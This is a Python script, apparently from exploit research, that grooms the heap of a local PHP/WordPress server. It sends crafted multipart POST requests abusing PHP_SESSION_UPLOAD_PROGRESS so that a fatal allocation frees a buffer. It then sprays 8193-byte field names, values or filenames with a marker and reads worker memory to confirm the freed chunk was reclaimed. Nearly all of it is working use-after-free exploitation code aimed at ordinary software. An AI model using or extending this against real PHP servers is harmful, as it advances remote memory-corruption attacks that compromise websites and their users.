#!/usr/bin/env python3
"""a2_groom_placement.py - which multipart allocation reclaims the freed d?

Fires a producer (poisons a child, d freed), then N+1 attempts from FRESH
connections (round-robin children; producer fatal closes keep-alive so
same-socket delivery is unavailable - the assisted scan verifies which
child holds the stale state and whether d got reclaimed).

Groom shapes tested (all ~8193B so the alloc needs 3 pages = the freed
3-page d run, best-fit):
  name8k     - 8193B FIELD NAME ("GROOMPROBE" markers, ASCII-only)
  value8k    - 8193B field VALUE
  fname8k    - 8193B FILE part filename
Each N+1 uses a FRESH SID with a small staged session file (so the decode
walks d). After each attempt: scan d content -> compare to the known
remnant -> RECLAIMED(by our marker?) / untouched / junk.
"""
import os
import re
import socket
import struct
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from a2_leak_collect import cexec, helper_scan, stage_session_file  # noqa

HOST, PORT = "127.0.0.1", 8099
B = b"WPFIRE"
REMNANT = None  # captured at start

def mp_body(sid, shape, marker=b"GR00MPROBE"):
    groom = (marker + b"-" * 8193)[:8193]
    parts = [b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' +
             sid.encode() + b"\r\n" +
             b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n']
    if shape == "name8k":
        parts.append(b"--" + B + b"\r\n" +
                     b'Content-Disposition: form-data; name="' + groom + b'"\r\n'
                     b"Content-Type: text/plain\r\n\r\nv\r\n")
    elif shape == "value8k":
        parts.append(b"--" + B + b"\r\n" +
                     b'Content-Disposition: form-data; name="g"\r\n'
                     b"Content-Type: text/plain\r\n\r\n" + groom + b"\r\n")
    elif shape == "fname8k":
        parts.append(b"--" + B + b"\r\n" +
                     b'Content-Disposition: form-data; name="u"; filename="' +
                     groom + b'"\r\n'
                     b"Content-Type: text/plain\r\n\r\nx\r\n")
    else:  # control: no groom field
        pass
    parts.append(b"--" + B + b"\r\n" +
                 b'Content-Disposition: form-data; name="u2"; filename="a.txt"\r\n'
                 b"Content-Type: text/plain\r\n\r\nx\r\n" +
                 b"--" + B + b"--\r\n")
    body = b"".join(parts)
    head = (f"POST / HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + body

def fire(req, timeout=25):
    try:
        s = socket.create_connection((HOST, PORT), timeout=15)
        s.sendall(req)
        s.settimeout(timeout)
        buf = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                buf += b"<TIMEOUT>"; break
            if not d:
                break
            buf += d
        s.close()
        return buf
    except ConnectionResetError:
        return b"<RESET>"

def classify(data, remnant):
    if data == remnant:
        return "UNTOUCHED"
    if b"GR00MPROBE" in data[:4096]:
        return "RECLAIMED-BY-GROOM (marker at 0x%x)" % data.find(b"GR00MPROBE")
    if data[:8] == b"\x00" * 8 and len(set(data)) < 8:
        return "reclaimed-junk (mostly zero)"
    return "RECLAIMED-OTHER (changed)"

def main():
    os.makedirs("results/wp-lastmile/a2", exist_ok=True)
    sidA = "wp2cA" + uuid.uuid4().hex[:24]
    assert stage_session_file(sidA)
    buf = fire(mp_body(sidA, "control"))
    m = re.search(rb"tried to allocate (\d+)", buf)
    print(f"[*] producer: fatal={m.group(1).decode() if m else 'NONE'}")
    hit = helper_scan()
    hit = next((k for k in hit if k["level"] not in (0, None)), None)
    if not hit:
        print("[-] no stale child"); return 1
    d = hit["data"]
    print(f"[+] stale child {hit['pid']} d=0x{d:x}")
    from a2_groom_probe import helper_read_at
    remnant = helper_read_at(hit["pid"], d, 8216)
    open("results/wp-lastmile/a2/remnant.bin", "wb").write(remnant)

    for shape, ntry in (("name8k", 4), ("value8k", 4), ("fname8k", 4)):
        print(f"\n=== shape {shape} ({ntry} attempts, fresh SIDs) ===")
        for i in range(ntry):
            sidB = "wp2cB" + uuid.uuid4().hex[:24]
            cexec(f"printf 'k|s:3:\"abc\";' > /tmp/sess_{sidB}; "
                  f"chown www-data:www-data /tmp/sess_{sidB}; chmod 600 /tmp/sess_{sidB}")
            resp = fire(mp_body(sidB, shape))
            m = re.search(rb"tried to allocate (\d+)",
                          resp.partition(b"\r\n\r\n")[2])
            tag = (m.group(1).decode() if m else
                   ("RESET" if resp == b"<RESET>" else
                    ("EOF0" if len(resp) == 0 else f"resp{len(resp)}")))
            # read d on the child that is stale NOW (may have changed)
            scan = helper_scan()
            hit2 = next((k for k in scan if k["level"] not in (0, None)), None)
            if not hit2:
                print(f"  [{i}] {tag} | no stale child (recycled)")
                continue
            data = helper_read_at(hit2["pid"], hit2["data"], 8216)
            cls = classify(data, remnant)
            print(f"  [{i}] {tag} | child {hit2['pid']} "
                  f"d=0x{hit2['data']:x} -> {cls}")
            if "GROOM" in cls:
                open(f"results/wp-lastmile/a2/{shape}_landed.bin", "wb").write(data)
                print("  >>> GROOM LANDS - shape confirmed <<<")
                break
            time.sleep(1)
    return 0

if __name__ == "__main__":
    sys.exit(main())
